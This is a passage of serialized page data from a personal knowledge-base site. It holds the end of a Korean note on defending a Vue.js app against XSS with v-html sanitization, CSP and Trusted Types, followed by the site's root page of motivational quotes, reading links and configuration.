maybe-class-name\"\u003eReport\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eOnly\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"token keyword module\"\u003edefault\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  script\u003cspan class=\"token operator\"\u003e-\u003c/span\u003esrc \u003cspan class=\"token string\"\u003e'self'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  report\u003cspan class=\"token operator\"\u003e-\u003c/span\u003euri \u003cspan class=\"token operator\"\u003e/\u003c/span\u003ecsp\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eviolation\u003cspan class=\"token operator\"\u003e-\u003c/span\u003ereport\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// CSP 위반 시 차단하지 않고 보고만 함\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"5-v-html의-위험성과-대안\"\u003e5. v-html의 위험성과 대안\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#5-v-html의-위험성과-대안\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"위험한-코드\"\u003e위험한 코드\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#위험한-코드\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-vue\"\u003e\u003ccode class=\"language-vue\"\u003e\u0026#x3C;div v-html=\"notice.content\"\u003e\u0026#x3C;/div\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"안전한-대안\"\u003e안전한 대안\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#안전한-대안\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-vue\"\u003e\u003ccode class=\"language-vue\"\u003e\u0026#x3C;!-- 1. 텍스트로만 렌더링 --\u003e\n\u0026#x3C;div v-text=\"notice.content\"\u003e\u0026#x3C;/div\u003e\n\n\u0026#x3C;!-- 2. DOMPurify로 정화된 HTML --\u003e\n\u0026#x3C;div v-html=\"sanitizedContent\"\u003e\u0026#x3C;/div\u003e\n\n\u0026#x3C;!-- 3. Markdown 파서 사용 (사용자 콘텐츠를 안전하게) --\u003e\n\u0026#x3C;template\u003e\n  \u0026#x3C;div v-html=\"parsedMarkdown\"\u003e\u0026#x3C;/div\u003e\n\u0026#x3C;/template\u003e\n\n\u0026#x3C;script\u003e\nimport marked from \"marked\"\nimport DOMPurify from \"dompurify\"\n\nexport default {\n  computed: {\n    parsedMarkdown() {\n      // Markdown을 HTML로 변환 후 정화\n      const rawHtml = marked.parse(this.userContent)\n      return DOMPurify.sanitize(rawHtml)\n    },\n  },\n}\n\u0026#x3C;/script\u003e\n\n\u0026#x3C;!-- 4. 코드 하이라이팅이 필요한 경우 --\u003e\n\u0026#x3C;script\u003e\nimport hljs from \"highlight.js\"\nimport DOMPurify from \"dompurify\"\n\n// DOMPurify 훅 추가로 코드 블록 안전하게 처리\nDOMPurify.addHook(\"afterSanitizeAttributes\", (node) =\u003e {\n  if (node.tagName === \"CODE\") {\n    hljs.highlightElement(node)\n  }\n})\n\u0026#x3C;/script\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"6-최신-보안-트렌드-csp-level-3-trusted-types\"\u003e6. 최신 보안 트렌드: CSP Level 3 Trusted Types\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#6-최신-보안-트렌드-csp-level-3-trusted-types\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"trusted-types를-사용한-xss-완화\"\u003eTrusted Types를 사용한 XSS 완화\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#trusted-types를-사용한-xss-완화\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e\u003cspan class=\"token comment\"\u003e// CSP에 Trusted Types 정책 추가\u003c/span\u003e\n\u003cspan class=\"token maybe-class-name\"\u003eContent\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003eSecurity\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token maybe-class-name\"\u003ePolicy\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n  require\u003cspan class=\"token operator\"\u003e-\u003c/span\u003etrusted\u003cspan class=\"token operator\"\u003e-\u003c/span\u003etypes\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token keyword control-flow\"\u003efor\u003c/span\u003e \u003cspan class=\"token string\"\u003e'script'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  trusted\u003cspan class=\"token operator\"\u003e-\u003c/span\u003etypes myPolicy\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// JavaScript에서 Trusted Types 정책 생성\u003c/span\u003e\n\u003cspan class=\"token keyword control-flow\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token dom variable\"\u003ewindow\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003etrustedTypes\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026#x26;\u0026#x26;\u003c/span\u003e trustedTypes\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003ecreatePolicy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e myPolicy \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e trustedTypes\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003ecreatePolicy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'myPolicy'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token function-variable function\"\u003ecreateHTML\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003einput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token arrow operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token comment\"\u003e// DOMPurify로 정화 후 TrustedHTML 반환\u003c/span\u003e\n      \u003cspan class=\"token keyword control-flow\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token maybe-class-name\"\u003eDOMPurify\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003esanitize\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003einput\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token function-variable function\"\u003ecreateScript\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003einput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token arrow operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token comment\"\u003e// 스크립트는 완전히 차단\u003c/span\u003e\n      \u003cspan class=\"token keyword control-flow\"\u003ethrow\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eError\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'Scripts not allowed'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// Vue.js와 결합\u003c/span\u003e\n\u003cspan class=\"token keyword module\"\u003eexport\u003c/span\u003e \u003cspan class=\"token keyword module\"\u003edefault\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token function\"\u003emounted\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// Trusted Types가 적용되면 innerHTML 직접 할당이 차단됨\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// this.$el.innerHTML = userContent; // ❌ 차단됨\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e// 정책을 통해서만 가능\u003c/span\u003e\n    \u003cspan class=\"token keyword control-flow\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token dom variable\"\u003ewindow\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003emyPolicy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003e$el\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token property-access\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e myPolicy\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token method function property-access\"\u003ecreateHTML\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euserContent\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e장점:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDOM XSS sink(innerHTML, outerHTML 등)를 근본적으로 차단\u003c/li\u003e\n\u003cli\u003eVue.js의 v-html도 Trusted Types 정책 적용 가능\u003c/li\u003e\n\u003cli\u003e브라우저 레벨에서 XSS 방지\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"결론\"\u003e결론\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#결론\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"csp만으로는-불충분하지만-여전히-중요합니다\"\u003eCSP만으로는 불충분하지만, 여전히 중요합니다\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp만으로는-불충분하지만-여전히-중요합니다\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCSP의 한계\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eStored XSS로 이미 삽입된 인라인 스크립트는 막기 어려움\u003c/li\u003e\n\u003cli\u003e특히 \u003ccode\u003eunsafe-inline\u003c/code\u003e을 허용하면 거의 무용지물\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e그래도 CSP가 필요한 이유\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e외부 리소스 로드 차단\u003c/li\u003e\n\u003cli\u003e데이터 유출 경로 차단\u003c/li\u003e\n\u003cli\u003e공격의 영향 범위 제한\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e올바른 접근 방법\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e입력 검증\u003c/strong\u003e (서버 측) - OWASP 권장 라이브러리 사용\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e출력 인코딩/Sanitization\u003c/strong\u003e (클라이언트 측)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e엄격한 CSP\u003c/strong\u003e (추가 방어층) - Nonce/Hash 활용\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ev-html 사용 최소화\u003c/strong\u003e - Markdown 파서 등 대안 활용\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTrusted Types\u003c/strong\u003e (최신 브라우저) - DOM XSS 근본 차단\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"보안-체크리스트\"\u003e보안 체크리스트\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#보안-체크리스트\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"필수-구현-사항\"\u003e필수 구현 사항\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#필수-구현-사항\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e CSP (Content Security Policy) 설정\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e Nonce 또는 Hash 기반 정책 적용\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e Report-Only 모드로 테스트 후 적용\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" checked disabled\u003e \u003ccode\u003ev-html\u003c/code\u003e 사용 위치 전수 검사\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e 서버 측 입력 검증\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e OWASP 권장 라이브러리 (validator.js, xss 등) 사용\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e WAF 도입 검토\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e 클라이언트 측 Sanitization\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e DOMPurify 라이브러리 적용\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e Markdown 파서 사용 시 정화 적용\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e CSP Level 3 Trusted Types 도입 (모던 브라우저)\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" checked disabled\u003e HttpOnly 쿠키 사용 고려 (CSRF 복잡도 vs localStorage)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"권장-구현-순서\"\u003e권장 구현 순서\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#권장-구현-순서\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e즉시\u003c/strong\u003e: v-html 제거 또는 DOMPurify 적용\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e단기\u003c/strong\u003e: 서버 측 입력 검증 강화\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e중기\u003c/strong\u003e: CSP Report-Only 모드 테스트\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e장기\u003c/strong\u003e: Trusted Types 도입\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e핵심\u003c/strong\u003e: v-html을 제거하거나 Sanitization을 적용하는 것이 CSP보다 더 근본적인 해결책입니다. CSP는 추가적인 방어층으로 활용해야 합니다. \u003cstrong\u003eDefense in Depth\u003c/strong\u003e 전략으로 다층 방어를 구축하세요.\u003c/p\u003e\n\u003c/blockquote\u003e","noteIndex":{"id":"Iy0MoL0KnL55Br3AfTS2C","title":"Luke","desc":"","updated":1761796791487,"created":1644449449778,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":"vault"},"contentHash":"4e745570ca97988a0362cb939b760952","links":[{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"life-tips","position":{"start":{"line":41,"column":5,"offset":2603},"end":{"line":41,"column":29,"offset":2627},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"life-tips","anchorHeader":"wodenokoto"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2025","alias":"What I read in 2025","position":{"start":{"line":70,"column":3,"offset":4333},"end":{"line":70,"column":54,"offset":4384},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2025"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2024","alias":"2024","position":{"start":{"line":71,"column":5,"offset":4389},"end":{"line":71,"column":41,"offset":4425},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2024"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2023","alias":"2023","position":{"start":{"line":72,"column":5,"offset":4430},"end":{"line":72,"column":41,"offset":4466},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2023"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-read-in.2022","alias":"2022","position":{"start":{"line":73,"column":5,"offset":4471},"end":{"line":73,"column":41,"offset":4507},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-read-in.2022"}},{"type":"wiki","from":{"fname":"root","id":"Iy0MoL0KnL55Br3AfTS2C","vaultName":"vault"},"value":"journal.what-i-struggled-brag-in","position":{"start":{"line":79,"column":3,"offset":4643},"end":{"line":79,"column":39,"offset":4679},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"journal.what-i-struggled-brag-in"}}],"anchors":{"what-i-read-in-past":{"type":"header","text":"What I read in past","value":"what-i-read-in-past","line":74,"column":0,"depth":2}},"children":["zd4mq442jike0pr0wba1u3m","6hzeqsofq67gdk88flxlkhp","778ijii93yu5uwnrwmn5zi4","g1fngdjl25nes6fs3lip602","ZbdkdApFqLdks4Moq92R9","uoc5hhki3o4py15cesddu8q","9qf7j06jtdkm6rnx9ymvwb0","5zn10cvj7ajy2gh2is5nqmg","4qo9ma0z0yu1czns6pxl7y5","ok0e729ho7o09xetujkxc0m","GR5x8HnNFEN6fU2UBSEIK","yirtnlj8q24yutcf3ss1xqy","eq0wc6t7wl2wv221yb68ro4","7x2fnv4j6gxts08qk0jguny","ettkt3iClONnxpbGwBVLl","7l4knev6v613tbuoskvmbdg","hvh5bud6yp7dc89tuh95tr9","4fvoqrplw0cweo554usbjos","f8qsfql0a9v8thpeo82udfa","1swsbrhqi9jk41v9eodyi5q","SQqYupi6EFddTerBA8RRD","hjNeNc1F2JUh0lTWanH4h","qf0l4wbrc9jgooyzexmbq5v","uur1lkol353z9vfeqb3n5bv","cd9n1czq3ursgkby985wkmm","k1sr43vwnfqztwc0s43pkcf","wfde75rhdvq2yfa2zy2q6rv","rjcmdv60jokmbw6zoq8u2ef","ujapvww8o6v3kpmlhtryq4k","pkwewou9d5e8ystswn1j2b4"],"parent":null,"data":{},"body":"\nHi there 👋. I'm a Front-end developer.\n\n---\n\n- 단순함과 꾸준함은 가장 쉬우면서도 지키기 어려운 원칙.\n\n- 🥱 -\u003e 🤔💡🌱 - [On The Death of Daydreaming](https://www.afterbabel.com/p/on-the-death-of-daydreaming)\n  - boredom -\u003e easy fun -\u003e art -\u003e profit?\n\n\u003e I've often described my motivation for building software to others using imagery: I like to go find a secluded beach, build a large, magnificent sand castle, and then walk away. Will anyone notice? Probably not. Will the waves eventually destroy it? Yep. Did I still get immense satisfaction? Absolutely. - [aliasxneo](https://news.ycombinator.com/item?id=41497113)\n\n\u003e We love to see the process, not just the result. The imperfections in your work can be beautiful if they show your struggle for perfection, not a lack of care. - [ralphammer](https://ralphammer.com/is-perfection-boring/)\n\n\u003e Simplicity, even if it sacrifices some ideal functionality has better survival characteristics than the-right-thing. - [The Rise of Worse is Better](https://www.dreamsongs.com/RiseOfWorseIsBetter.html)\n\n\u003e [Roberto Blake was talking about making 100 crappy videos](https://www.youtube.com/watch?v=OnUBaQ1Sp_E) to get better over time. Putting in the reps and improving a little bit each time.\n\u003e\n\u003e Putting in the work without expecting any external reward at first (eg views, followers, likes, etc) will pay off in the long run. - [100 Scrappy Things](https://www.florin-pop.com/blog/100-scrappy-things/)\n\n\u003e Make the difficult habitual, the habitual easy, and the easy beautiful. - [Constantin S. Stanislavski](https://www.goodreads.com/quotes/7102271-make-the-difficult-habitual-the-habitual-easy-and-the-easy)\n\n\u003e A good match is a **structured** dance, where players aim to **score** while they are following well-defined **rules**. This **freedom within a structure** is what makes it fun. - [ralphammer](https://ralphammer.com/how-to-get-started/)\n\n- [Pivot Points](https://longform.asmartbear.com/pivot-points/)\n\n  - non-judgmental aspects of personality that can be strengths in some contexts and weaknesses in others\n  - Pivot Points are fixed in the short term\n\n- [Hedged Bets](https://longform.asmartbear.com/predict-the-future/#hedged-bets)\n  - trading slightly less maximum upside for predictable, net-positive outcomes.\n\n\u003e “Motivation often comes after starting, not before. Action produces momentum.”\n\u003e [When you start a new habit, it should take less than two minutes to do.](https://jamesclear.com/how-to-stop-procrastinating)\n\u003e\n\u003e - James Clear\n\n\u003e Focus is more about **not** keeping busy when you need to wait for something.  \n\u003e Eat the boredom for a minute.\n\u003e\n\u003e - [[life-tips#wodenokoto]]\n\n\u003e [4 minutes run hard enough to push heart rate to 90%, 3 minutes recover, repeat 4 times](https://news.ycombinator.com/item?id=34213181)\n\u003e\n\u003e - https://www.ntnu.edu/cerg/advice\n\u003e - [Get running with Couch to 5K](https://www.nhs.uk/live-well/exercise/running-and-aerobic-exercises/get-running-with-couch-to-5k/)\n\n\u003e [recommended routine - bodyweightfitness](https://www.reddit.com/r/bodyweightfitness/wiki/kb/recommended_routine/) - I Don't Have This Much Time!\n\u003e\n\u003e - Don't workout at all (saves anywhere from 20 to 60 minutes, but really, really, really, really, really, really, really, really, really not recommended)\n\n\u003e 도무지 읽히지 않는 책 앞에서 내가 택한 방법은 펼쳐진 페이지 앞에서 멍때리기이다. 다르게 표현하면 이렇다. 펼쳐진 두 페이지 앞에서 오래 머물기.\n\u003e\n\u003e 책을 펼쳐놓는 것으로 충분하다. 읽지 못해도 좋다. 매일 정해진 진도를 나가야 하는 학교 수업이 아니니까. 하지만 읽지 않아도 괜찮다고 해서 펼쳐두지조차 않으면 곤란하다. 가능한 한 자주 책을 펼쳐두도록 하자. 전혀 읽지 않고 멍하니 바라보고 있다가 다시 덮게 되더라도\n\u003e\n\u003e - 막막한 독서. 시로군. P.10~13\n\n\u003e I think it should be everyone's primary focus to sleep well, drink water, get outside, get active, and eat generally decently. I hate to say it, but if you're not eating a good amount of vegetables and fruit, decent protein, sleep, etc, no amount of XYZ will catch up to that detriment. - [CE02](https://news.ycombinator.com/item?id=35056071)\n\n\u003e My real battle is doing good versus doing nothing. - [Deirdre Sullivan](https://www.npr.org/2005/08/08/4785079/always-go-to-the-funeral)\n\n[Kind Engineering](https://kind.engineering/) - How To Engineer Kindness\n\n\u003e Sometimes magic is just someone spending more time on something than anyone else might reasonably expect. - [Teller](https://www.goodreads.com/quotes/6641527-sometimes-magic-is-just-someone-spending-more-time-on-something)\n\n---\n\n## What I read in past\n\n- [[What I read in 2025|journal.what-i-read-in.2025]]\n  - [[2024|journal.what-i-read-in.2024]]\n  - [[2023|journal.what-i-read-in.2023]]\n  - [[2022|journal.what-i-read-in.2022]]\n- 📝 [Gists](https://gist.github.com/Luke-SNAW)\n- 📜 [Journals](https://luke-snaw.github.io/Luke-SNAW__netlify-CMS.github.io/)\n\n---\n\n- [[journal.what-i-struggled-brag-in]]\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":"vault"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"","dateFormat":"","addBehavior":"childOfCurrent","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link","taskCompleteStatus":["done","x"]},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":false,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"dendronVersion":"0.115.0","enableFullHierarchyNoteTitle":false,"enablePersistentHistory":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false,"enableFrontmatterTags":true,"enableHashesForFMTags":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Luke SNAW","description":"Personal knowledge space"},"github":{"enableEditLink":false,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"lookup","siteUrl":"https://luke-snaw.github.io/","duplicateNoteBehavior":{"action":"useVault","payload":["vault"]},"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"fof5x2htn0tr6euz2trv2mu"},"buildId":"vOE8u-mg___OsOsz4tjEg","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>